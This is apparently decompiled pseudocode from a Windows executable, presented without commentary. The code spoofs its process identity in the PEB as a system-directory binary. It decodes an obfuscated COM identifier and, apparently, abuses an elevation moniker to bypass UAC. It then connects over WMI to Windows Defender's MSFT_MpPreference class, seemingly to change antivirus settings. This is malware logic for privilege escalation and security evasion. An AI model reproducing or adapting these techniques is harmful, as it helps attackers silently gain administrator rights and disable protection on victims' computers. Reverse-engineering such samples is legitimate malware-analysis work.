      lVar52 = FUN_14000afc2((longlong)(&stack0x000014a0 + lVar12),lVar61,uVar58 * 8,param_4,
                             *(ulonglong *)(&stack0xffffffffffffffe0 + lVar12));
      if (lVar52 != 0) {
        uVar58 = uVar59 & 0x1fffffffffffffff;
        goto LAB_14000172c;
      }
    }
    lVar52 = 0;
    uVar58 = 0;
  }
LAB_14000172c:
  if (lVar52 == 0) {
    (&stack0x000012b0)[lVar12] = 0x1fffffffffffffff < uVar59;
    if (0x1fffffffffffffff < uVar59) goto LAB_140001861;
    *(undefined1 **)(&stack0x00001058 + lVar12) = &stack0x000014a0 + lVar12;
    *(undefined ***)(&stack0x00001060 + lVar12) = &PTR_FUN_14002dd80;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400017b9;
    FUN_14000b48b((longlong *)(&stack0x00001160 + lVar12),(undefined8 *)(&stack0x00001058 + lVar12),
                  uVar59 * 8);
    if (*(short *)(&stack0x00001168 + lVar12) != 0) goto LAB_140001861;
    lVar52 = *(longlong *)(&stack0x00001160 + lVar12);
    uVar33 = *(ulonglong *)(&stack0x00001558 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400017e8;
    FUN_14000d5a5(lVar52,lVar61,uVar33 * 8);
    puVar56 = *(ushort **)(&stack0x00001530 + lVar12);
    lVar53 = *(longlong *)(&stack0x00001548 + lVar12);
    uVar58 = uVar59;
    param_4 = puVar56;
    if (puVar56 != (ushort *)0x0) {
      lVar34 = *(longlong *)(&stack0x000014b0 + lVar12);
      lVar44 = *(longlong *)(lVar34 + 8);
      if (lVar34 + lVar44 + 0x18 == lVar61 + (longlong)puVar56 * 8) {
        param_4 = (ushort *)((longlong)puVar56 * 8);
        LOCK();
        if (lVar44 == *(longlong *)(lVar34 + 8)) {
          *(longlong *)(lVar34 + 8) = lVar44 + (longlong)puVar56 * -8;
        }
        UNLOCK();
      }
    }
  }
  else {
    lVar53 = *(longlong *)(&stack0x00001548 + lVar12);
  }
LAB_14000173b:
  *(longlong *)(lVar52 + uVar33 * 8) = lVar53;
  uVar33 = *(ulonglong *)(&stack0x00000038 + lVar12);
  uVar59 = *puVar47;
  *(ulonglong *)(&stack0x00001550 + lVar12) = uVar60;
  *(ulonglong *)(&stack0x00001530 + lVar12) = uVar58;
  plVar55 = (longlong *)((longlong)aWStackX_20 + lVar12);
  lVar61 = lVar52;
  goto LAB_14000120e;
LAB_140001cb5:
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001cba;
  FUN_14000a118();
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001cbf;
  FUN_14000a0ab();
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001cc4;
  DVar28 = GetCurrentProcessId();
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001ccb;
  FUN_140009dd8(DVar28);
  if (((&stack0x00001520)[lVar12] & 1) != 0) {
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001cd9;
    FUN_14000a118();
    pcVar5 = DAT_1400342b8;
    *(undefined8 *)((longlong)aWStackX_20 + lVar12) = 0;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001ced;
    pvVar37 = GetCurrentProcess();
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 8;
    uVar35 = *(undefined8 *)((longlong)&uStack_48 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001cf8;
    iVar29 = (*pcVar5)(pvVar37,uVar35,(undefined8 *)((longlong)aWStackX_20 + lVar12));
    if (iVar29 == 0) {
LAB_14000226b:
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000227c;
      DVar28 = GetModuleFileNameW((HMODULE)0x0,(LPWSTR)((longlong)aWStackX_20 + lVar12),0x800);
      if (DVar28 - 0x800 < 0xfffff801) goto LAB_1400029c4;
      plVar55 = (longlong *)(&stack0x00001558 + lVar12);
      *plVar55 = *plVar55 + -1;
      if (*plVar55 != 0) {
        *(longlong *)(&stack0x00001540 + lVar12) = lVar52 + 0x10;
        plVar55 = (longlong *)(lVar52 + 0x18);
        lVar52 = 0;
        lVar61 = *(longlong *)(&stack0x00001558 + lVar12);
        while (bVar63 = lVar61 != 0, lVar61 = lVar61 + -1, bVar63) {
          lVar52 = lVar52 + *plVar55 * 2 + 3;
          plVar55 = plVar55 + 2;
        }
        *(undefined1 **)(&stack0x00001058 + lVar12) = &stack0x000014a0 + lVar12;
        *(undefined ***)(&stack0x00001060 + lVar12) = &PTR_FUN_14002dd80;
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000262c;
        FUN_140009730((longlong *)(&stack0x00001160 + lVar12),
                      (undefined8 *)(&stack0x00001058 + lVar12),lVar52 + 1);
        if (*(short *)(&stack0x00001168 + lVar12) != 0) goto LAB_1400029c4;
        *(undefined8 *)(&stack0x00001548 + lVar12) = *(undefined8 *)(&stack0x00001160 + lVar12);
        *(undefined8 *)(&stack0x00001550 + lVar12) = 0;
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 1;
        lVar61 = *(longlong *)((longlong)&uStack_48 + lVar12);
        *(undefined8 *)(&stack0x00001530 + lVar12) = 0;
        do {
          if (*(longlong *)(&stack0x00001530 + lVar12) == *(longlong *)(&stack0x00001558 + lVar12))
          goto LAB_1400029cb;
          lVar34 = *(longlong *)(&stack0x00001530 + lVar12) * 0x10;
          lVar52 = *(longlong *)(*(longlong *)(&stack0x00001540 + lVar12) + lVar34);
          uVar33 = *(ulonglong *)(*(longlong *)(&stack0x00001540 + lVar12) + 8 + lVar34);
          if (*(longlong *)(&stack0x00001530 + lVar12) != 0) {
            lVar34 = *(longlong *)(&stack0x00001550 + lVar12);
            *(undefined2 *)(*(longlong *)(&stack0x00001548 + lVar12) + lVar34 * 2) = 0x20;
            *(longlong *)(&stack0x00001550 + lVar12) = lVar34 + 1;
          }
          *(undefined8 *)(&stack0xffffffffffffffe0 + lVar12) = 3;
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400026e4;
          FUN_140006e17((longlong *)(&stack0x00001340 + lVar12),lVar52,uVar33,0x14002d9b4,
                        *(longlong *)(&stack0xffffffffffffffe0 + lVar12));
          (&stack0x00001538)[lVar12] = (&stack0x00001348)[lVar12];
          if ((&stack0x00001348)[lVar12] != '\0') {
            lVar34 = *(longlong *)(&stack0x00001550 + lVar12);
            *(undefined2 *)(*(longlong *)(&stack0x00001548 + lVar12) + lVar34 * 2) = 0x22;
            *(longlong *)(&stack0x00001550 + lVar12) = lVar34 + 1;
          }
          lVar34 = *(longlong *)(&stack0x00001548 + lVar12) +
                   *(longlong *)(&stack0x00001550 + lVar12) * 2;
          lVar53 = 0;
          for (; 7 < uVar33; uVar33 = uVar33 - 8) {
            uVar57 = *(ulonglong *)(lVar52 + lVar53);
            if ((((((((uVar57 >> 7 & 1) != 0 || (uVar57 >> 0xf & 1) != 0) ||
                    (uVar57 >> 0x17 & 1) != 0) || (uVar57 >> 0x1f & 1) != 0) ||
                  (uVar57 >> 0x27 & 1) != 0) || (uVar57 >> 0x2f & 1) != 0) ||
                (uVar57 >> 0x37 & 1) != 0) || (uVar57 & 0x8000000000000000) != 0) break;
            auVar14._8_6_ = 0;
            auVar14._0_8_ = uVar57;
            auVar14[0xe] = (char)(uVar57 >> 0x38);
            auVar15._8_4_ = 0;
            auVar15._0_8_ = uVar57;
            auVar15[0xc] = (char)(uVar57 >> 0x30);
            auVar15._13_2_ = auVar14._13_2_;
            auVar16._8_4_ = 0;
            auVar16._0_8_ = uVar57;
            auVar16._12_3_ = auVar15._12_3_;
            auVar17._8_2_ = 0;
            auVar17._0_8_ = uVar57;
            auVar17[10] = (char)(uVar57 >> 0x28);
            auVar17._11_4_ = auVar16._11_4_;
            auVar18._8_2_ = 0;
            auVar18._0_8_ = uVar57;
            auVar18._10_5_ = auVar17._10_5_;
            auVar19[8] = (char)(uVar57 >> 0x20);
            auVar19._0_8_ = uVar57;
            auVar19._9_6_ = auVar18._9_6_;
            auVar21._7_8_ = 0;
            auVar21._0_7_ = auVar19._8_7_;
            auVar23._1_8_ = SUB158(auVar21 << 0x40,7);
            auVar23[0] = (char)(uVar57 >> 0x18);
            auVar23._9_6_ = 0;
            auVar24._1_10_ = SUB1510(auVar23 << 0x30,5);
            auVar24[0] = (char)(uVar57 >> 0x10);
            auVar24._11_4_ = 0;
            auVar64._3_12_ = SUB1512(auVar24 << 0x20,3);
            auVar64[2] = (char)(uVar57 >> 8);
            auVar64[0] = (byte)uVar57;
            auVar64[1] = 0;
            auVar64[0xf] = 0;
            *(undefined1 (*) [16])(lVar34 + lVar53 * 2) = auVar64;
            lVar53 = lVar53 + 8;
          }
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002762;
          FUN_1400092cd((undefined8 *)(&stack0x00001058 + lVar12),
                        (undefined1 (*) [16])(lVar52 + lVar53),uVar33);
          if (*(short *)(&stack0x00001068 + lVar12) != 0) goto LAB_1400029c4;
          *(undefined8 *)(&stack0x00001160 + lVar12) = *(undefined8 *)(&stack0x00001058 + lVar12);
          *(undefined8 *)(&stack0x00001168 + lVar12) = *(undefined8 *)(&stack0x00001060 + lVar12);
          *(undefined8 *)(&stack0x00001170 + lVar12) = 0;
          while( true ) {
            *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002793;
            FUN_140009944(&stack0x000013c0 + lVar12,&stack0x00001160 + lVar12);
            if ((&stack0x000013c4)[lVar12] == '\0') break;
            uVar26 = *(uint *)(&stack0x000013c0 + lVar12);
            if ((uVar26 & 0x1fffff) < 0x10000) {
              *(ushort *)(lVar34 + lVar53 * 2) = (ushort)uVar26;
              lVar52 = lVar61;
            }
            else {
              *(ushort *)(lVar34 + lVar53 * 2) =
                   (ushort)((uVar26 + 0x1f0000 & 0x1ffc00) >> 10) | 0xd800;
              *(ushort *)(lVar34 + 2 + lVar53 * 2) = (ushort)uVar26 & 0x3ff | 0xdc00;
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 2;
              lVar52 = *(longlong *)((longlong)&uStack_48 + lVar12);
            }
            lVar53 = lVar53 + lVar52;
          }
          lVar53 = lVar53 + *(longlong *)(&stack0x00001550 + lVar12);
          if ((&stack0x00001538)[lVar12] != '\0') {
            *(undefined2 *)(*(longlong *)(&stack0x00001548 + lVar12) + lVar53 * 2) = 0x22;
            lVar53 = lVar53 + 1;
          }
          *(longlong *)(&stack0x00001530 + lVar12) = *(longlong *)(&stack0x00001530 + lVar12) + 1;
          *(longlong *)(&stack0x00001550 + lVar12) = lVar53;
        } while( true );
      }
      *(undefined8 *)(&stack0x00001548 + lVar12) = 0;
      do {
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400022b8;
        UVar32 = GetWindowsDirectoryA(&stack0x00001058 + lVar12,0x104);
        if (0xfffffefc < UVar32 - 0x104) {
          puVar48 = &DAT_14002d9b8;
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xd;
          uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400022e2;
          uVar35 = FUN_140009ca4((longlong)(&stack0x000013a0 + lVar12),0x14002d9b8,uVar33);
          *(undefined1 **)(&stack0x00001478 + lVar12) = &stack0x00001058 + lVar12;
          *(ulonglong *)(&stack0x00001480 + lVar12) = (ulonglong)UVar32;
          *(undefined8 *)(&stack0x00001488 + lVar12) = uVar35;
          *(undefined **)(&stack0x00001490 + lVar12) = puVar48;
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002316;
          FUN_14000863c((undefined8 *)(&stack0x000014e8 + lVar12),&stack0x00001160 + lVar12,300,
                        (longlong *)(&stack0x00001478 + lVar12));
          if (*(short *)(&stack0x000014f8 + lVar12) == 0) {
            *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000233e;
            FUN_1400093d9((longlong *)(&stack0x00001500 + lVar12),
                          *(undefined1 (**) [16])(&stack0x000014e8 + lVar12),
                          *(ulonglong *)(&stack0x000014f0 + lVar12));
            if (*(short *)(&stack0x00001510 + lVar12) == 0) {
              lVar61 = *(longlong *)(&stack0x00001500 + lVar12);
              lVar52 = *(longlong *)(&stack0x00001508 + lVar12);
              puVar48 = &DAT_14002d9c5;
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x42;
              uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000236e;
              pauVar39 = (undefined1 (*) [16])
                         FUN_140009ca4((longlong)(&stack0x00001340 + lVar12),0x14002d9c5,uVar33);
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002383;
              FUN_1400093d9((longlong *)(&stack0x000014d0 + lVar12),pauVar39,(ulonglong)puVar48);
              pvVar25 = ProcessEnvironmentBlock;
              if (*(short *)(&stack0x000014e0 + lVar12) == 0) {
                uVar35 = *(undefined8 *)(&stack0x000014d0 + lVar12);
                *(undefined8 *)(&stack0x00001558 + lVar12) =
                     *(undefined8 *)(&stack0x000014d8 + lVar12);
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400023b5;
                uVar33 = FUN_1400084dc(lVar61);
                if (uVar33 < 0x104) {
                  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400023da;
                  FUN_14000d5a5(0x140034398,lVar61,uVar33 * 2);
                  *(undefined2 *)(&DAT_140034398 + uVar33 * 2) = 0;
                  lVar34 = 0;
                  lVar53 = 0;
                  do {
                    lVar44 = lVar53;
                    if (-lVar34 == uVar33) break;
                    lVar2 = lVar34 * 2;
                    lVar34 = lVar34 + -1;
                    lVar53 = lVar44 + 2;
                  } while (*(short *)(uVar33 * 2 + 0x140034396 + lVar2) != 0x5c);
                  lVar34 = *(longlong *)((longlong)pvVar25 + 0x20);
                  DAT_140034370 = *(longlong *)(lVar34 + 0x68);
                  DAT_140034378 = *(longlong *)(lVar34 + 0x78);
                  sVar22 = (short)uVar33 * 2;
                  sVar45 = (short)uVar33 * 2 + 2;
                  *(short *)(lVar34 + 0x60) = sVar22;
                  *(short *)(lVar34 + 0x62) = sVar45;
                  *(undefined **)(lVar34 + 0x68) = &DAT_140034398;
                  sVar13 = (short)lVar44;
                  *(short *)(lVar34 + 0x70) = sVar13;
                  *(short *)(lVar34 + 0x72) = sVar13 + 2;
                  *(undefined **)(lVar34 + 0x78) = &DAT_140034398 + (uVar33 * 2 - lVar44);
                  plVar54 = (longlong *)(*(longlong *)((longlong)pvVar25 + 0x18) + 0x10);
                  plVar55 = plVar54;
                  do {
                    plVar55 = (longlong *)*plVar55;
                    if (plVar55 == plVar54) goto LAB_1400024a6;
                  } while (plVar55[6] != *(longlong *)((longlong)pvVar25 + 0x10));
                  DAT_140034388 = plVar55[10];
                  DAT_140034390 = plVar55[0xc];
                  DAT_140034380 = plVar55;
                  *(short *)(plVar55 + 9) = sVar22;
                  *(short *)((longlong)plVar55 + 0x4a) = sVar45;
                  plVar55[10] = (longlong)&DAT_140034398;
                  *(short *)(plVar55 + 0xb) = sVar13;
                  *(short *)((longlong)plVar55 + 0x5a) = sVar13 + 2;
                  plVar55[0xc] = (longlong)(&DAT_140034398 + (uVar33 * 2 - lVar44));
LAB_1400024a6:
                  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 9;
                  uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
                  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400024bd;
                  pCVar40 = (LPCSTR)FUN_140009ca4((longlong)(&stack0x00001450 + lVar12),0x14002da17,
                                                  uVar33);
                  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400024c8;
                  hModule = GetModuleHandleA(pCVar40);
                  if (hModule == (HMODULE)0x0) {
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400024d5;
                    hModule = LoadLibraryA(pCVar40);
                    if (hModule != (HMODULE)0x0) goto LAB_1400024da;
                  }
                  else {
LAB_1400024da:
                    puVar50 = &stack0x000013c0 + lVar12;
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xe;
                    uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400024fa;
                    pCVar40 = (LPCSTR)FUN_140009ca4((longlong)puVar50,0x14002da20,uVar33);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002505;
                    DAT_140034358 = GetProcAddress(hModule,pCVar40);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xb;
                    uVar57 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000251f;
                    pCVar40 = (LPCSTR)FUN_140009ca4((longlong)puVar50,0x14002da2e,uVar57);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000252a;
                    DAT_140034360 = GetProcAddress(hModule,pCVar40);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002543;
                    pCVar40 = (LPCSTR)FUN_140009ca4((longlong)puVar50,0x14002da39,uVar33);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000254e;
                    DAT_140034368 = GetProcAddress(hModule,pCVar40);
                  }
                  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 2;
                  uVar11 = *(undefined8 *)((longlong)&uStack_48 + lVar12);
                  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002562;
                  IVar41 = (*DAT_140034358)(0,uVar11);
                  *(undefined1 (*) [16])(&stack0x00001410 + lVar12) = (undefined1  [16])0x0;
                  *(undefined1 (*) [16])(&stack0x00001420 + lVar12) = (undefined1  [16])0x0;
                  *(undefined1 (*) [16])(&stack0x00001430 + lVar12) = (undefined1  [16])0x0;
                  *(undefined8 *)(&stack0x00001470 + lVar12) = 0;
                  *(undefined4 *)(&stack0x00001410 + lVar12) = 0x30;
                  *(undefined4 *)(&stack0x00001424 + lVar12) = 4;
                  for (lVar34 = 0; lVar34 != 0x10; lVar34 = lVar34 + 1) {
                    (&stack0x00001440)[lVar34 + lVar12] =
                         (&DAT_14002d880)[lVar34] ^ (&DAT_14002da07)[lVar34];
                  }
                  *(undefined8 *)(&stack0x00001330 + lVar12) =
                       *(undefined8 *)(&stack0x00001440 + lVar12);
                  *(undefined8 *)(&stack0x00001338 + lVar12) =
                       *(undefined8 *)(&stack0x00001448 + lVar12);
                  puVar50 = &stack0x00001410 + lVar12;
                  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000285a;
                  IVar42 = (*DAT_140034360)(uVar35,puVar50,&stack0x00001330 + lVar12,
                                            &stack0x00001470 + lVar12);
                  sVar45 = (short)puVar50;
                  plVar55 = *(longlong **)(&stack0x00001470 + lVar12);
                  if ((int)IVar42 < 0 || plVar55 == (longlong *)0x0) {
                    bVar63 = false;
                  }
                  else {
                    lVar53 = *plVar55;
                    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar12) = 0;
                    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar12) = 0;
                    lVar34 = (longlong)aWStackX_20 + lVar12;
                    pcVar5 = *(code **)(lVar53 + 0x48);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000288d;
                    iVar29 = (*pcVar5)(plVar55,lVar34,*(undefined8 *)(&stack0x00001548 + lVar12),0);
                    sVar45 = (short)lVar34;
                    bVar63 = -1 < iVar29;
                    pcVar5 = *(code **)(*plVar55 + 0x10);
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000289c;
                    (*pcVar5)(plVar55);
                  }
                  if ((int)IVar41 == 0) {
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400028ab;
                    (*DAT_140034368)();
                  }
                  lVar34 = *(longlong *)((longlong)ProcessEnvironmentBlock + 0x20);
                  if (DAT_140034370 != 0) {
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400028c9;
                    lVar53 = FUN_140008379(DAT_140034370);
                    sVar13 = sVar45 * 2;
                    sVar45 = sVar45 * 2 + 2;
                    *(short *)(lVar34 + 0x60) = sVar13;
                    *(short *)(lVar34 + 0x62) = sVar45;
                    *(longlong *)(lVar34 + 0x68) = lVar53;
                  }
                  if (DAT_140034378 != 0) {
                    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400028f2;
                    lVar53 = FUN_140008379(DAT_140034378);
                    sVar13 = sVar45 * 2;
                    sVar45 = sVar45 * 2 + 2;
                    *(short *)(lVar34 + 0x70) = sVar13;
                    *(short *)(lVar34 + 0x72) = sVar45;
                    *(longlong *)(lVar34 + 0x78) = lVar53;
                  }
                  plVar55 = DAT_140034380;
                  if (DAT_140034380 != (longlong *)0x0) {
                    if (DAT_140034388 != 0) {
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002927;
                      lVar34 = FUN_140008379(DAT_140034388);
                      sVar13 = sVar45 * 2;
                      sVar45 = sVar45 * 2 + 2;
                      *(short *)(plVar55 + 9) = sVar13;
                      *(short *)((longlong)plVar55 + 0x4a) = sVar45;
                      plVar55[10] = lVar34;
                    }
                    if (DAT_140034390 != 0) {
                      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140002950;
                      lVar34 = FUN_140008379(DAT_140034390);
                      *(short *)(plVar55 + 0xb) = sVar45 * 2;
                      *(short *)((longlong)plVar55 + 0x5a) = sVar45 * 2 + 2;
                      plVar55[0xc] = lVar34;
                    }
                  }
                  DAT_140034370 = 0;
                  DAT_140034378 = 0;
                  DAT_140034380 = (longlong *)0x0;
                  DAT_140034388 = 0;
                  DAT_140034390 = 0;
                }
                else {
                  bVar63 = false;
                }
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400029a6;
                FUN_140009264((undefined8 *)&DAT_1400172b0,uVar35,
                              *(longlong *)(&stack0x00001558 + lVar12));
              }
              else {
                bVar63 = false;
              }
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400029b8;
              FUN_140009264((undefined8 *)&DAT_1400172b0,lVar61,lVar52);
              if (bVar63) {
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400029c4;
                FUN_1400090f2(0);
              }
            }
          }
        }
LAB_1400029c4:
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400029cb;
        FUN_1400090f2(1);
LAB_1400029cb:
        *(undefined2 *)
         (*(longlong *)(&stack0x00001548 + lVar12) + *(longlong *)(&stack0x00001550 + lVar12) * 2) =
             0;
      } while( true );
    }
    *(int *)(&stack0x00001058 + lVar12) = 0;
    *(undefined4 *)(&stack0x00001160 + lVar12) = 0;
    *(undefined1 **)(&stack0xffffffffffffffe0 + lVar12) = &stack0x00001160 + lVar12;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14;
    uVar35 = *(undefined8 *)((longlong)&uStack_48 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 4;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001d2e;
    iVar30 = (*DAT_1400342c0)(*(undefined8 *)((longlong)aWStackX_20 + lVar12),uVar35);
    iVar29 = *(int *)(&stack0x00001058 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001d3c;
    CloseHandle(*(HANDLE *)((longlong)aWStackX_20 + lVar12));
    if ((iVar30 == 0) || (iVar29 == 0)) goto LAB_14000226b;
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 2;
  uVar35 = *(undefined8 *)((longlong)&uStack_48 + lVar12);
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001d56;
  HVar31 = CoInitializeEx((LPVOID)0x0,(DWORD)uVar35);
  if (-1 < HVar31 || HVar31 == -0x7ffefefa) {
    *(undefined8 *)((longlong)aWStackX_20 + lVar12 + -0x20) = 0;
    *(undefined4 *)(&stack0xfffffffffffffff8 + lVar12) = 0;
    *(undefined8 *)(&stack0xfffffffffffffff0 + lVar12) = 0;
    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar12) = 3;
    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar12) = 0;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xffffffffffffffff;
    uVar35 = *(undefined8 *)((longlong)&uStack_48 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001d99;
    CoInitializeSecurity
              ((PSECURITY_DESCRIPTOR)0x0,(LONG)uVar35,(SOLE_AUTHENTICATION_SERVICE *)0x0,(void *)0x0
               ,*(DWORD *)(&stack0xffffffffffffffe0 + lVar12),
               *(DWORD *)(&stack0xffffffffffffffe8 + lVar12),
               *(void **)(&stack0xfffffffffffffff0 + lVar12),
               *(DWORD *)(&stack0xfffffffffffffff8 + lVar12),
               *(void **)((longlong)aWStackX_20 + lVar12 + -0x20));
    *(undefined8 *)(&stack0x000014e8 + lVar12) = 0;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001db7;
    FUN_140009654((undefined8 *)(&stack0x00001410 + lVar12),0x14002d742);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001dcd;
    FUN_140009654((undefined8 *)(&stack0x000013c0 + lVar12),0x14002d752);
    *(undefined1 **)(&stack0xffffffffffffffe0 + lVar12) = &stack0x000014e8 + lVar12;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 1;
    uVar35 = *(undefined8 *)((longlong)&uStack_48 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001dea;
    HVar31 = CoCreateInstance((IID *)(&stack0x00001410 + lVar12),(LPUNKNOWN)0x0,(DWORD)uVar35,
                              (IID *)(&stack0x000013c0 + lVar12),
                              *(LPVOID **)(&stack0xffffffffffffffe0 + lVar12));
    plVar55 = *(longlong **)(&stack0x000014e8 + lVar12);
    if (plVar55 != (longlong *)0x0 && -1 < HVar31) {
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1f;
      uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001e13;
      bstrString = FUN_14000921a((undefined1 (*) [16])"root\\Microsoft\\Windows\\Defender",uVar33);
      if (bstrString != (BSTR)0x0) {
        *(undefined8 *)(&stack0x00001500 + lVar12) = 0;
        lVar61 = *plVar55;
        uVar35 = *(undefined8 *)(&stack0x000014e8 + lVar12);
        *(undefined1 **)((longlong)aWStackX_20 + lVar12 + -0x20) = &stack0x00001500 + lVar12;
        *(undefined1 (*) [16])(&stack0xfffffffffffffff0 + lVar12) = (undefined1  [16])0x0;
        *(undefined4 *)(&stack0xffffffffffffffe8 + lVar12) = 0;
        *(undefined8 *)(&stack0xffffffffffffffe0 + lVar12) = 0;
        pcVar5 = *(code **)(lVar61 + 0x18);
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001e5f;
        iVar29 = (*pcVar5)(uVar35,bstrString,0);
        pProxy = *(IUnknown **)(&stack0x00001500 + lVar12);
        if (pProxy != (IUnknown *)0x0 && -1 < iVar29) {
          *(undefined4 *)(&stack0xfffffffffffffff8 + lVar12) = 0;
          *(undefined8 *)(&stack0xfffffffffffffff0 + lVar12) = 0;
          *(undefined4 *)(&stack0xffffffffffffffe8 + lVar12) = 3;
          *(undefined4 *)(&stack0xffffffffffffffe0 + lVar12) = 0;
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xffffffffffffffff;
          DVar28 = (DWORD)*(undefined8 *)((longlong)&uStack_48 + lVar12);
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001ea2;
          CoSetProxyBlanket(pProxy,DVar28,DVar28,(OLECHAR *)0x0,
                            *(DWORD *)(&stack0xffffffffffffffe0 + lVar12),
                            *(DWORD *)(&stack0xffffffffffffffe8 + lVar12),
                            *(RPC_AUTH_IDENTITY_HANDLE *)(&stack0xfffffffffffffff0 + lVar12),
                            *(DWORD *)(&stack0xfffffffffffffff8 + lVar12));
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x11;
          uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001eb1;
          riid = (IID *)FUN_14000921a((undefined1 (*) [16])"MSFT_MpPreference",uVar33);
          if (riid != (IID *)0x0) {
            *(undefined8 *)(&stack0x000014d0 + lVar12) = 0;
            pIVar7 = pProxy->lpVtbl;
            *(undefined1 **)(&stack0xffffffffffffffe0 + lVar12) = &stack0x000014d0 + lVar12;
            *(undefined8 *)(&stack0xffffffffffffffe8 + lVar12) = 0;
            p_Var8 = pIVar7[2].QueryInterface;
            *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001eed;
            HVar31 = (*p_Var8)(*(IUnknown **)(&stack0x00001500 + lVar12),riid,(void **)0x0);
            plVar54 = *(longlong **)(&stack0x000014d0 + lVar12);
            if (plVar54 != (longlong *)0x0 && -1 < HVar31) {
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 3;
              uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001f16;
              ppvObject = (void **)FUN_14000921a((undefined1 (*) [16])&DAT_14002d794,uVar33);
              if (ppvObject != (void **)0x0) {
                plVar9 = (longlong *)(&stack0x000013a0 + lVar12);
                *plVar9 = 0;
                lVar61 = *plVar54;
                *(undefined8 *)(&stack0xffffffffffffffe0 + lVar12) = 0;
                pcVar5 = *(code **)(lVar61 + 0x98);
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001f4c;
